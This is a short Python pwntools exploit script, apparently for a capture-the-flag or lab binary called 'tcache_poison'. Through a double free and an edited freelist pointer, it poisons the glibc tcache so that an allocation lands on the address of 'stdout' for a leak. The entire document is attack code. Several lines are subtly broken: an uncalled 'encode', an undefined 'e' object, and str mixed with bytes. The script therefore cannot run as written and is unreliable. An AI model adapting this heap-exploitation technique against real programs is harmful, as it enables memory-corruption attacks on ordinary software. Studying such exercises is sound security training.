from pwn import *

p = process('./tcache_poison')

def allocate(size, data):
  p.sendline(b"1")
  p.sendlineafter(b"Size: ", str(size).encode)
  p.sendlineafter(b"Content: ", data)

def free():
  p.sendline(b"2")

def prt():
  p.sendline(b"3")

def edit(data):
  p.sendline(b"4")
  p.sendlineafter(b"chunk: ", data)

allocate(0x20, b"l0ux503n")
free()

edit(b"A"*8 + "\x00")
free()

addr_stdout = e.symbols['stdout']
allocate(0x20, p64(addr_stdout))

allocate(0x20, b"A"*8)
allocate(0x20, b"\x60")

prt()

p.interactive()